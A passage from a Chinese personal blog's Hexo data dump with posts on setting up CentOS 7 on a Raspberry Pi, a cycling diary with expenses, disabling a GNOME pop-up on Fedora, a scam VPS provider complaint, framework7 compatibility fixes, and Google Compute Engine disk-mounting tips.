libxml2-devel-2.9.1-6.el7.2.armv7hl\n--&gt; Finished Dependency Resolution\nError: Package: libxml2-devel-2.9.1-6.el7.2.armv7hl (updates)\n           Requires: xz-devel\n\n$ sudo yum install xz-devel\nNo package xz-devel available.\n`\n</code></pre><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">`xz-devel`目前只在官方dev仓库里有：http://armv7.dev.centos.org/repodir/c7-buildroot/xz/</span><br></pre></td></tr></table></figure>\n<p>`sudo rpm -i “<a href=\"http://armv7.dev.centos.org/repodir/c7-buildroot/xz/xz-devel-5.1.2-9alpha.el7.armv7hl.rpm&quot;\" target=\"_blank\" rel=\"noopener\">http://armv7.dev.centos.org/repodir/c7-buildroot/xz/xz-devel-5.1.2-9alpha.el7.armv7hl.rpm&quot;</a></p>\n<p>所以单独从RPM文件安装<code>xz-devel</code>，之后，就能顺利编译PHP的libxml2模块。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>前一阵买了个树莓派，可是三分钟热度没玩几天就扔下了。现在由于手头没有linux机器，所以又开始折腾了。</p>\n<h2 id=\"记录下我遇到的问题：\"><a href=\"#记录下我遇到的问题：\" class=\"headerlink\" title=\"记录下我遇到的问题：\"></a>记录下我遇到的问题：</h2><h3 id=\"有线网卡灯不亮\"><a href=\"#有线网卡灯不亮\" class=\"headerlink\" title=\"有线网卡灯不亮\"></a>有线网卡灯不亮</h3><p>这是电流强度不足的问题，需要确保输出电流是2A，才能带动网卡运行。通常手机充电器只有1.5A的输出，所以只能保证系统基本运转。<br>我的充电器是从淘宝买的树莓派专用的。</p>\n<h3 id=\"能用centos吗？\"><a href=\"#能用centos吗？\" class=\"headerlink\" title=\"能用centos吗？\"></a>能用centos吗？</h3><p>现在可以了，centos7有arm树莓派版。下载地址：</p>\n<blockquote>\n<p><a href=\"http://mirror.centos.org/altarch/7/isos/armhfp/CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz\" target=\"_blank\" rel=\"noopener\">CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz</a></p>\n</blockquote>\n<p>启动盘制作方法有很多参考资料，win10下面我用的Win32DiskImager，和烧录其它img没有区别。<br>注意启动树莓派后，不需要显示器界面来设置密码。直接SSH用户名<code>root</code>，密码<code>centos</code>即可登录，参见：</p>\n<blockquote>\n<p><a href=\"https://www.anyran.com/2015/12/21818.html\" target=\"_blank\" rel=\"noopener\">CentOS 7 for ARM 初体验</a></p>\n</blockquote>\n<h3 id=\"编译遇到的问题\"><a href=\"#编译遇到的问题\" class=\"headerlink\" title=\"编译遇到的问题\"></a>编译遇到的问题</h3><p>用yum安装<code>libxml2</code>时，提示缺少<code>xz-devel</code>，但是yum仓库里没有<code>xz-devel.armv7hl</code></p>\n<pre><code>$ sudo yum install libxml2-devel\n---&gt; Package libxml2-devel.armv7hl 0:2.9.1-6.el7.2 will be installed\n--&gt; Processing Dependency: xz-devel for package: libxml2-devel-2.9.1-6.el7.2.armv7hl\n--&gt; Finished Dependency Resolution\nError: Package: libxml2-devel-2.9.1-6.el7.2.armv7hl (updates)\n           Requires: xz-devel\n\n$ sudo yum install xz-devel\nNo package xz-devel available.\n`\n</code></pre><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">`xz-devel`目前只在官方dev仓库里有：http://armv7.dev.centos.org/repodir/c7-buildroot/xz/</span><br></pre></td></tr></table></figure>\n<p>`sudo rpm -i “<a href=\"http://armv7.dev.centos.org/repodir/c7-buildroot/xz/xz-devel-5.1.2-9alpha.el7.armv7hl.rpm&quot;\" target=\"_blank\" rel=\"noopener\">http://armv7.dev.centos.org/repodir/c7-buildroot/xz/xz-devel-5.1.2-9alpha.el7.armv7hl.rpm&quot;</a></p>\n<p>所以单独从RPM文件安装<code>xz-devel</code>，之后，就能顺利编译PHP的libxml2模块。</p>\n"},{"title":"骑行  日记","id":"6","date":"2014-03-20T00:41:38.000Z","_content":"\n昨天骑了一天，全身酸麻，所以今天早上起来才写写点日记。\n\n想想好想没有什么有意思，一路沿着107国道蹬啊蹬，从没停止过呼吸汽车尾气和灰尘。河北这地方到处是驴肉XX，我不吃驴肉狗肉蛙肉什么的（虽然都曾经有意无意吃到过）。在路边买了一个煎饼，才四块钱，吃了几口上面就落下灰了。\n\n不过河北保定的物价真便宜啊，晚上买了一碗刀削面才6块，米线8块。不过这个刀削面看起来不卫生，还没吃。晚上也去超市买了点榨菜果汁，昨天路上就带了一个火腿罐头，还不好吃，又饥又渴。今天别再受这罪了。\n\n早上起来写了会代码，把之前的任务弄好了，九点出发，估计晚上6点到石家庄吧\n\n&nbsp;\n\n记录下昨天一天的消费：\n\n1.  早上，在家附近的庆丰包子吃了14块，包子很难吃，形状还不好，只吃了一点，主要是喝可乐\n2.  8点多在房山区买了两瓶水7块\n3.  12点在高碑店市吧，买了个煎饼四块钱\n4.  晚上6点来到如家，住宿花了137\n5.  7点买了点饭 （刀削面）6  +（米线）8  +（面包）4\n6.  9点去了超市， 23块\n&nbsp;\n\n一天总共花了 14 + 7 + 4 + 137 + 6 + 8 + 4 + 23 = 203","source":"_posts/e9-aa-91-e8-a1-8c-e6-97-a5-e8-ae-b0.md","raw":"---\ntitle: 骑行  日记\nid: 6\ncategories:\n  - 骑行\ndate: 2014-03-20 08:41:38\ntags:\n---\n\n昨天骑了一天，全身酸麻，所以今天早上起来才写写点日记。\n\n想想好想没有什么有意思，一路沿着107国道蹬啊蹬，从没停止过呼吸汽车尾气和灰尘。河北这地方到处是驴肉XX，我不吃驴肉狗肉蛙肉什么的（虽然都曾经有意无意吃到过）。在路边买了一个煎饼，才四块钱，吃了几口上面就落下灰了。\n\n不过河北保定的物价真便宜啊，晚上买了一碗刀削面才6块，米线8块。不过这个刀削面看起来不卫生，还没吃。晚上也去超市买了点榨菜果汁，昨天路上就带了一个火腿罐头，还不好吃，又饥又渴。今天别再受这罪了。\n\n早上起来写了会代码，把之前的任务弄好了，九点出发，估计晚上6点到石家庄吧\n\n&nbsp;\n\n记录下昨天一天的消费：\n\n1.  早上，在家附近的庆丰包子吃了14块，包子很难吃，形状还不好，只吃了一点，主要是喝可乐\n2.  8点多在房山区买了两瓶水7块\n3.  12点在高碑店市吧，买了个煎饼四块钱\n4.  晚上6点来到如家，住宿花了137\n5.  7点买了点饭 （刀削面）6  +（米线）8  +（面包）4\n6.  9点去了超市， 23块\n&nbsp;\n\n一天总共花了 14 + 7 + 4 + 137 + 6 + 8 + 4 + 23 = 203","slug":"e9-aa-91-e8-a1-8c-e6-97-a5-e8-ae-b0","published":1,"updated":"2018-03-05T11:32:58.726Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhw30022lzlmwnwru4z7","content":"<p>昨天骑了一天，全身酸麻，所以今天早上起来才写写点日记。</p>\n<p>想想好想没有什么有意思，一路沿着107国道蹬啊蹬，从没停止过呼吸汽车尾气和灰尘。河北这地方到处是驴肉XX，我不吃驴肉狗肉蛙肉什么的（虽然都曾经有意无意吃到过）。在路边买了一个煎饼，才四块钱，吃了几口上面就落下灰了。</p>\n<p>不过河北保定的物价真便宜啊，晚上买了一碗刀削面才6块，米线8块。不过这个刀削面看起来不卫生，还没吃。晚上也去超市买了点榨菜果汁，昨天路上就带了一个火腿罐头，还不好吃，又饥又渴。今天别再受这罪了。</p>\n<p>早上起来写了会代码，把之前的任务弄好了，九点出发，估计晚上6点到石家庄吧</p>\n<p>&nbsp;</p>\n<p>记录下昨天一天的消费：</p>\n<ol>\n<li>早上，在家附近的庆丰包子吃了14块，包子很难吃，形状还不好，只吃了一点，主要是喝可乐</li>\n<li>8点多在房山区买了两瓶水7块</li>\n<li>12点在高碑店市吧，买了个煎饼四块钱</li>\n<li>晚上6点来到如家，住宿花了137</li>\n<li>7点买了点饭 （刀削面）6  +（米线）8  +（面包）4</li>\n<li>9点去了超市， 23块<br>&nbsp;</li>\n</ol>\n<p>一天总共花了 14 + 7 + 4 + 137 + 6 + 8 + 4 + 23 = 203</p>\n","site":{"data":{}},"excerpt":"","more":"<p>昨天骑了一天，全身酸麻，所以今天早上起来才写写点日记。</p>\n<p>想想好想没有什么有意思，一路沿着107国道蹬啊蹬，从没停止过呼吸汽车尾气和灰尘。河北这地方到处是驴肉XX，我不吃驴肉狗肉蛙肉什么的（虽然都曾经有意无意吃到过）。在路边买了一个煎饼，才四块钱，吃了几口上面就落下灰了。</p>\n<p>不过河北保定的物价真便宜啊，晚上买了一碗刀削面才6块，米线8块。不过这个刀削面看起来不卫生，还没吃。晚上也去超市买了点榨菜果汁，昨天路上就带了一个火腿罐头，还不好吃，又饥又渴。今天别再受这罪了。</p>\n<p>早上起来写了会代码，把之前的任务弄好了，九点出发，估计晚上6点到石家庄吧</p>\n<p>&nbsp;</p>\n<p>记录下昨天一天的消费：</p>\n<ol>\n<li>早上，在家附近的庆丰包子吃了14块，包子很难吃，形状还不好，只吃了一点，主要是喝可乐</li>\n<li>8点多在房山区买了两瓶水7块</li>\n<li>12点在高碑店市吧，买了个煎饼四块钱</li>\n<li>晚上6点来到如家，住宿花了137</li>\n<li>7点买了点饭 （刀削面）6  +（米线）8  +（面包）4</li>\n<li>9点去了超市， 23块<br>&nbsp;</li>\n</ol>\n<p>一天总共花了 14 + 7 + 4 + 137 + 6 + 8 + 4 + 23 = 203</p>\n"},{"title":"fedora23关掉gnome弹窗","id":"289","date":"2016-02-05T05:07:35.000Z","_content":"\n我用的桌面是最新的fedora23，它有时候会莫名其妙的弹出gnome的网页弹窗。\n\n经过对进程排查，弹窗的进程文件是 `/usr/libexec/gnome-shell-portal-helper`，所以只要删除这个执行文件就可以屏蔽了。","source":"_posts/fedora23-e5-85-b3-e6-8e-89gnome-e5-bc-b9-e7-aa-97.md","raw":"---\ntitle: fedora23关掉gnome弹窗\nid: 289\ncategories:\n  - linux\ndate: 2016-02-05 13:07:35\ntags:\n---\n\n我用的桌面是最新的fedora23，它有时候会莫名其妙的弹出gnome的网页弹窗。\n\n经过对进程排查，弹窗的进程文件是 `/usr/libexec/gnome-shell-portal-helper`，所以只要删除这个执行文件就可以屏蔽了。","slug":"fedora23-e5-85-b3-e6-8e-89gnome-e5-bc-b9-e7-aa-97","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhw40025lzlmp0msg3qr","content":"<p>我用的桌面是最新的fedora23，它有时候会莫名其妙的弹出gnome的网页弹窗。</p>\n<p>经过对进程排查，弹窗的进程文件是 <code>/usr/libexec/gnome-shell-portal-helper</code>，所以只要删除这个执行文件就可以屏蔽了。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>我用的桌面是最新的fedora23，它有时候会莫名其妙的弹出gnome的网页弹窗。</p>\n<p>经过对进程排查，弹窗的进程文件是 <code>/usr/libexec/gnome-shell-portal-helper</code>，所以只要删除这个执行文件就可以屏蔽了。</p>\n"},{"title":"fortacloud.co购买主机被坑记","id":"38","date":"2015-05-13T22:21:21.000Z","_content":"\n想买个香港主机，点进google的搜索广告进入了fortacloud.co(骗子公司，千万不要买哦)网站．\n发现vps还算便宜，而且网站也很精美，应该是个高大上的主机商吧．结果买了后发现完全是个骗局.\n\n**我遭遇的问题：**\n\n*   创建的主机始终无法登录SSH,重置密码,用SSH KEY登录都没用\n*   我选择的是香港机房,但分配给我的主机IP却在美国．而且香港主机购买时本身要多加钱的\n*   发ticket想解决无法登录的问题,但发一个ticket竟然要收5美元\n*   收就收了,结果超过一天了都没有回复\n*   进网站的banner有IBM的logo,我以为是IBM旗下云服务,结果和IBM一点关系都没有\n后来觉得不对了,才google发现这完全就是个骗子公司，后悔买之前没看看口碑．\n**受害者的讨论:**\n\n*   [http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps](http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps)\n*   [http://lowendtalk.com/discussion/comment/883116/](http://lowendtalk.com/discussion/comment/883116/)\n-----------------------------\n后续:\n\n2015/05/30更新\n\n他们还是会继续从你的信用卡扣费,即便你什么服务也没开,没法取消.\n\n刚才向google ads举报了他们,不过看起来google不会去管:\n> www.fortacloud.co site is a liar!!! Their product is not available, submit tickets did not respond.\r> \n> And will not stop from the credit card chargeback, you can not cancel.\r> \n> There are many victims, reviews feedback:\r> \n> www.fortatrust-wont-cancel-my-account.com , http://lowendtalk.com/discussion/42162/fortacloud-co-review-please\r> \n> They also have an old liar site www.fortatrust.com\r> \n> Evaluation: https://www.trustpilot.com/review/www.fortatrust.com\r> \n> \n> I was deceived click on google advertisement, I hope you as soon as possible, do not let more people injured!\ngoogle的自动回复,看来希望渺茫,还会有更多人上当\n> 感謝您提出意見，通知我們有廣告違反了 AdWords 政策。儘管我們無法親自回覆您的意見，但一定會將它轉達給相關小組，並在必要時採取適當的行動。\n今天尝试把账户的信用卡换成空卡卡号,不知道管不管用. 万事达也不能禁止从商户扣款,真操蛋","source":"_posts/fortacloud-co-e8-b4-ad-e4-b9-b0-e4-b8-bb-e6-9c-ba-e8-a2-ab-e5-9d-91-e8-ae-b0.md","raw":"---\ntitle: fortacloud.co购买主机被坑记\nid: 38\ncategories:\n  - linux\ndate: 2015-05-14 06:21:21\ntags:\n---\n\n想买个香港主机，点进google的搜索广告进入了fortacloud.co(骗子公司，千万不要买哦)网站．\n发现vps还算便宜，而且网站也很精美，应该是个高大上的主机商吧．结果买了后发现完全是个骗局.\n\n**我遭遇的问题：**\n\n*   创建的主机始终无法登录SSH,重置密码,用SSH KEY登录都没用\n*   我选择的是香港机房,但分配给我的主机IP却在美国．而且香港主机购买时本身要多加钱的\n*   发ticket想解决无法登录的问题,但发一个ticket竟然要收5美元\n*   收就收了,结果超过一天了都没有回复\n*   进网站的banner有IBM的logo,我以为是IBM旗下云服务,结果和IBM一点关系都没有\n后来觉得不对了,才google发现这完全就是个骗子公司，后悔买之前没看看口碑．\n**受害者的讨论:**\n\n*   [http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps](http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps)\n*   [http://lowendtalk.com/discussion/comment/883116/](http://lowendtalk.com/discussion/comment/883116/)\n-----------------------------\n后续:\n\n2015/05/30更新\n\n他们还是会继续从你的信用卡扣费,即便你什么服务也没开,没法取消.\n\n刚才向google ads举报了他们,不过看起来google不会去管:\n> www.fortacloud.co site is a liar!!! Their product is not available, submit tickets did not respond.\r> \n> And will not stop from the credit card chargeback, you can not cancel.\r> \n> There are many victims, reviews feedback:\r> \n> www.fortatrust-wont-cancel-my-account.com , http://lowendtalk.com/discussion/42162/fortacloud-co-review-please\r> \n> They also have an old liar site www.fortatrust.com\r> \n> Evaluation: https://www.trustpilot.com/review/www.fortatrust.com\r> \n> \n> I was deceived click on google advertisement, I hope you as soon as possible, do not let more people injured!\ngoogle的自动回复,看来希望渺茫,还会有更多人上当\n> 感謝您提出意見，通知我們有廣告違反了 AdWords 政策。儘管我們無法親自回覆您的意見，但一定會將它轉達給相關小組，並在必要時採取適當的行動。\n今天尝试把账户的信用卡换成空卡卡号,不知道管不管用. 万事达也不能禁止从商户扣款,真操蛋","slug":"fortacloud-co-e8-b4-ad-e4-b9-b0-e4-b8-bb-e6-9c-ba-e8-a2-ab-e5-9d-91-e8-ae-b0","published":1,"updated":"2018-03-05T11:32:58.726Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhw60027lzlm8bgoxi2r","content":"<p>想买个香港主机，点进google的搜索广告进入了fortacloud.co(骗子公司，千万不要买哦)网站．<br>发现vps还算便宜，而且网站也很精美，应该是个高大上的主机商吧．结果买了后发现完全是个骗局.</p>\n<p><strong>我遭遇的问题：</strong></p>\n<ul>\n<li>创建的主机始终无法登录SSH,重置密码,用SSH KEY登录都没用</li>\n<li>我选择的是香港机房,但分配给我的主机IP却在美国．而且香港主机购买时本身要多加钱的</li>\n<li>发ticket想解决无法登录的问题,但发一个ticket竟然要收5美元</li>\n<li>收就收了,结果超过一天了都没有回复</li>\n<li><p>进网站的banner有IBM的logo,我以为是IBM旗下云服务,结果和IBM一点关系都没有<br>后来觉得不对了,才google发现这完全就是个骗子公司，后悔买之前没看看口碑．<br><strong>受害者的讨论:</strong></p>\n</li>\n<li><p><a href=\"http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps\" target=\"_blank\" rel=\"noopener\">http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps</a></p>\n</li>\n<li><a href=\"http://lowendtalk.com/discussion/comment/883116/\" target=\"_blank\" rel=\"noopener\">http://lowendtalk.com/discussion/comment/883116/</a></li>\n</ul>\n<hr>\n<p>后续:</p>\n<p>2015/05/30更新</p>\n<p>他们还是会继续从你的信用卡扣费,即便你什么服务也没开,没法取消.</p>\n<p>刚才向google ads举报了他们,不过看起来google不会去管:</p>\n<blockquote>\n<p><a href=\"http://www.fortacloud.co\" target=\"_blank\" rel=\"noopener\">www.fortacloud.co</a> site is a liar!!! Their product is not available, submit tickets did not respond.</p>\n<p>And will not stop from the credit card chargeback, you can not cancel.</p>\n<p>There are many victims, reviews feedback:</p>\n<p><a href=\"http://www.fortatrust-wont-cancel-my-account.com\" target=\"_blank\" rel=\"noopener\">www.fortatrust-wont-cancel-my-account.com</a> , <a href=\"http://lowendtalk.com/discussion/42162/fortacloud-co-review-please\" target=\"_blank\" rel=\"noopener\">http://lowendtalk.com/discussion/42162/fortacloud-co-review-please</a></p>\n<p>They also have an old liar site <a href=\"http://www.fortatrust.com\" target=\"_blank\" rel=\"noopener\">www.fortatrust.com</a></p>\n<p>Evaluation: <a href=\"https://www.trustpilot.com/review/www.fortatrust.com\" target=\"_blank\" rel=\"noopener\">https://www.trustpilot.com/review/www.fortatrust.com</a></p>\n<p>I was deceived click on google advertisement, I hope you as soon as possible, do not let more people injured!<br>google的自动回复,看来希望渺茫,还会有更多人上当<br>感謝您提出意見，通知我們有廣告違反了 AdWords 政策。儘管我們無法親自回覆您的意見，但一定會將它轉達給相關小組，並在必要時採取適當的行動。<br>今天尝试把账户的信用卡换成空卡卡号,不知道管不管用. 万事达也不能禁止从商户扣款,真操蛋</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<p>想买个香港主机，点进google的搜索广告进入了fortacloud.co(骗子公司，千万不要买哦)网站．<br>发现vps还算便宜，而且网站也很精美，应该是个高大上的主机商吧．结果买了后发现完全是个骗局.</p>\n<p><strong>我遭遇的问题：</strong></p>\n<ul>\n<li>创建的主机始终无法登录SSH,重置密码,用SSH KEY登录都没用</li>\n<li>我选择的是香港机房,但分配给我的主机IP却在美国．而且香港主机购买时本身要多加钱的</li>\n<li>发ticket想解决无法登录的问题,但发一个ticket竟然要收5美元</li>\n<li>收就收了,结果超过一天了都没有回复</li>\n<li><p>进网站的banner有IBM的logo,我以为是IBM旗下云服务,结果和IBM一点关系都没有<br>后来觉得不对了,才google发现这完全就是个骗子公司，后悔买之前没看看口碑．<br><strong>受害者的讨论:</strong></p>\n</li>\n<li><p><a href=\"http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps\" target=\"_blank\" rel=\"noopener\">http://lowendtalk.com/discussion/31635/fortacloud-2-gig-ram-free-vps</a></p>\n</li>\n<li><a href=\"http://lowendtalk.com/discussion/comment/883116/\" target=\"_blank\" rel=\"noopener\">http://lowendtalk.com/discussion/comment/883116/</a></li>\n</ul>\n<hr>\n<p>后续:</p>\n<p>2015/05/30更新</p>\n<p>他们还是会继续从你的信用卡扣费,即便你什么服务也没开,没法取消.</p>\n<p>刚才向google ads举报了他们,不过看起来google不会去管:</p>\n<blockquote>\n<p><a href=\"http://www.fortacloud.co\" target=\"_blank\" rel=\"noopener\">www.fortacloud.co</a> site is a liar!!! Their product is not available, submit tickets did not respond.</p>\n<p>And will not stop from the credit card chargeback, you can not cancel.</p>\n<p>There are many victims, reviews feedback:</p>\n<p><a href=\"http://www.fortatrust-wont-cancel-my-account.com\" target=\"_blank\" rel=\"noopener\">www.fortatrust-wont-cancel-my-account.com</a> , <a href=\"http://lowendtalk.com/discussion/42162/fortacloud-co-review-please\" target=\"_blank\" rel=\"noopener\">http://lowendtalk.com/discussion/42162/fortacloud-co-review-please</a></p>\n<p>They also have an old liar site <a href=\"http://www.fortatrust.com\" target=\"_blank\" rel=\"noopener\">www.fortatrust.com</a></p>\n<p>Evaluation: <a href=\"https://www.trustpilot.com/review/www.fortatrust.com\" target=\"_blank\" rel=\"noopener\">https://www.trustpilot.com/review/www.fortatrust.com</a></p>\n<p>I was deceived click on google advertisement, I hope you as soon as possible, do not let more people injured!<br>google的自动回复,看来希望渺茫,还会有更多人上当<br>感謝您提出意見，通知我們有廣告違反了 AdWords 政策。儘管我們無法親自回覆您的意見，但一定會將它轉達給相關小組，並在必要時採取適當的行動。<br>今天尝试把账户的信用卡换成空卡卡号,不知道管不管用. 万事达也不能禁止从商户扣款,真操蛋</p>\n</blockquote>\n"},{"title":"framework7 入门笔记","id":"200","date":"2015-11-21T02:32:21.000Z","_content":"\nframework7是一个前端UI框架，它能保持和原生应用一样的UI风格，操作体验。\n> 官网 [http://www.idangero.us/framework7](http://www.idangero.us/framework7)\n今天遇到了第一个问题:\n\n初始化框架时报错:\n```\nresult of expression this[0].\"classList\" is not an object  (framework7.min.js:22)\n```\n这是由于浏览器版本太低，比如 Safari7 不支持 `classList` 特性，才会有这个错误。\n> 支持的浏览器版本：[http://caniuse.com/#feat=classlist](http://caniuse.com/#feat=classlist)\n可以使用这个补丁解决： [https://github.com/eligrey/classList.js](https://github.com/eligrey/classList.js)\n\n需要在解析framework7.min.js之前，先加载这个补丁。它会给不支持的浏览器DOM补上`classList`的功能\n\n&nbsp;\n\n由于我只有一个android手机，没有测试出这个兼容性问题，浪费了其他同事的测试时间。后来在 [https://crossbrowsertesting.com/](https://crossbrowsertesting.com/) 上用真机IPAD免费测试，才算定位到问题。\n\n&nbsp;","source":"_posts/framework7-e5-85-a5-e9-97-a8-e7-ac-94-e8-ae-b0.md","raw":"---\ntitle: framework7 入门笔记\nid: 200\ncategories:\n  - 前端\ndate: 2015-11-21 10:32:21\ntags:\n---\n\nframework7是一个前端UI框架，它能保持和原生应用一样的UI风格，操作体验。\n> 官网 [http://www.idangero.us/framework7](http://www.idangero.us/framework7)\n今天遇到了第一个问题:\n\n初始化框架时报错:\n```\nresult of expression this[0].\"classList\" is not an object  (framework7.min.js:22)\n```\n这是由于浏览器版本太低，比如 Safari7 不支持 `classList` 特性，才会有这个错误。\n> 支持的浏览器版本：[http://caniuse.com/#feat=classlist](http://caniuse.com/#feat=classlist)\n可以使用这个补丁解决： [https://github.com/eligrey/classList.js](https://github.com/eligrey/classList.js)\n\n需要在解析framework7.min.js之前，先加载这个补丁。它会给不支持的浏览器DOM补上`classList`的功能\n\n&nbsp;\n\n由于我只有一个android手机，没有测试出这个兼容性问题，浪费了其他同事的测试时间。后来在 [https://crossbrowsertesting.com/](https://crossbrowsertesting.com/) 上用真机IPAD免费测试，才算定位到问题。\n\n&nbsp;","slug":"framework7-e5-85-a5-e9-97-a8-e7-ac-94-e8-ae-b0","published":1,"updated":"2018-03-05T12:55:52.928Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhw70029lzlmr6y7pbs6","content":"<p>framework7是一个前端UI框架，它能保持和原生应用一样的UI风格，操作体验。</p>\n<blockquote>\n<p>官网 <a href=\"http://www.idangero.us/framework7\" target=\"_blank\" rel=\"noopener\">http://www.idangero.us/framework7</a><br>今天遇到了第一个问题:</p>\n</blockquote>\n<p>初始化框架时报错:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result of expression this[0].&quot;classList&quot; is not an object  (framework7.min.js:22)</span><br></pre></td></tr></table></figure></p>\n<p>这是由于浏览器版本太低，比如 Safari7 不支持 <code>classList</code> 特性，才会有这个错误。</p>\n<blockquote>\n<p>支持的浏览器版本：<a href=\"http://caniuse.com/#feat=classlist\" target=\"_blank\" rel=\"noopener\">http://caniuse.com/#feat=classlist</a><br>可以使用这个补丁解决： <a href=\"https://github.com/eligrey/classList.js\" target=\"_blank\" rel=\"noopener\">https://github.com/eligrey/classList.js</a></p>\n</blockquote>\n<p>需要在解析framework7.min.js之前，先加载这个补丁。它会给不支持的浏览器DOM补上<code>classList</code>的功能</p>\n<p>&nbsp;</p>\n<p>由于我只有一个android手机，没有测试出这个兼容性问题，浪费了其他同事的测试时间。后来在 <a href=\"https://crossbrowsertesting.com/\" target=\"_blank\" rel=\"noopener\">https://crossbrowsertesting.com/</a> 上用真机IPAD免费测试，才算定位到问题。</p>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>framework7是一个前端UI框架，它能保持和原生应用一样的UI风格，操作体验。</p>\n<blockquote>\n<p>官网 <a href=\"http://www.idangero.us/framework7\" target=\"_blank\" rel=\"noopener\">http://www.idangero.us/framework7</a><br>今天遇到了第一个问题:</p>\n</blockquote>\n<p>初始化框架时报错:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result of expression this[0].&quot;classList&quot; is not an object  (framework7.min.js:22)</span><br></pre></td></tr></table></figure></p>\n<p>这是由于浏览器版本太低，比如 Safari7 不支持 <code>classList</code> 特性，才会有这个错误。</p>\n<blockquote>\n<p>支持的浏览器版本：<a href=\"http://caniuse.com/#feat=classlist\" target=\"_blank\" rel=\"noopener\">http://caniuse.com/#feat=classlist</a><br>可以使用这个补丁解决： <a href=\"https://github.com/eligrey/classList.js\" target=\"_blank\" rel=\"noopener\">https://github.com/eligrey/classList.js</a></p>\n</blockquote>\n<p>需要在解析framework7.min.js之前，先加载这个补丁。它会给不支持的浏览器DOM补上<code>classList</code>的功能</p>\n<p>&nbsp;</p>\n<p>由于我只有一个android手机，没有测试出这个兼容性问题，浪费了其他同事的测试时间。后来在 <a href=\"https://crossbrowsertesting.com/\" target=\"_blank\" rel=\"noopener\">https://crossbrowsertesting.com/</a> 上用真机IPAD免费测试，才算定位到问题。</p>\n<p>&nbsp;</p>\n"},{"title":"GCE的一些注意事项","id":"137","date":"2015-07-21T16:03:29.000Z","_content":"\nGCE用了几个月，还算不错，挺稳定的．我也遇到几个问题，整理出来：\n\n## 无法发送邮件\n\n这个没办法，google封锁了出口流量中的25等邮件端口（还包括SSL邮件端口）．能收取，但不能向外网主机发送邮件．\n\n官方说明: [https://cloud.google.com/compute/docs/tutorials/sending-mail/](https://cloud.google.com/compute/docs/tutorials/sending-mail/) 解决办法也在这文章下面\n\n## 控制台绑定硬盘不生效\n\n还需要手动挂载到系统目录，和阿里云一样．先确认是否绑定成功，查看当前硬盘列表:\n```\n$ ls -l /dev/disk/by-id/\nlrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/google-instance-3 -> ../../sda\nlrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/google-instance-3-part1 -> ../../sda1\nlrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/google-persistent-disk-1 -> ../../sdb\nlrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3 -> ../../sda\nlrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3-part1 -> ../../sda1\nlrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/scsi-0Google_PersistentDisk_persistent-disk-1 -> ../../sdb\n\n```\nOK，可以看到 **/dev/disk/by-id/google-persistent-disk-1** 就是新创建的硬盘 **disk-1**\n\n现在需要在机器中手动挂载，比如硬盘20G **disk-1** 在 **/dev/disk/by-id/google-persistent-disk-1**，想挂载到 **/data**\n```\n$ sudo /usr/share/google/safe_format_and_mount -m \"mkfs.ext4 -F\" /dev/disk/by-id/google-persistent-disk-1 /data\nsafe_format_and_mount: Running: fsck.xfs -a /dev/disk/by-id/google-persistent-disk-1\nsafe_format_and_mount: /sbin/fsck.xfs: XFS file system.\nsafe_format_and_mount: Running: mount -o discard,defaults /dev/disk/by-id/google-persistent-disk-1 /data\n$ df -h\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        10G  7.2G  2.9G  72% /\ndevtmpfs        1.9G     0  1.9G   0% /dev\ntmpfs           1.9G     0  1.9G   0% /dev/shm\ntmpfs           1.9G  193M  1.7G  11% /run\ntmpfs           1.9G     0  1.9G   0% /sys/fs/cgroup\n/dev/sdb         20G   45M   19G   1% /data\n\n```\n可以看到生效了\n\n详细文档：[https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk](https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk)\n\n## 执行**gcloud**命令遇到 Insufficient Permission 错误\n\n这是gcloud配置还没有认证\n```\n$ sudo /usr/local/bin/gcloud auth login\n\n...  这里会给出一个授权网页链接，机器的账户授权后会给一个verification code\n\nEnter verification code: \n\n```\n&nbsp;\n\n暂时就这些．总的来说挺喜欢GCE的，而且前3个月免费哦!","source":"_posts/gce-e7-9a-84-e4-b8-80-e4-ba-9b-e6-b3-a8-e6-84-8f-e4-ba-8b-e9-a1-b9.md","raw":"---\ntitle: GCE的一些注意事项\nid: 137\ncategories:\n  - linux\ndate: 2015-07-22 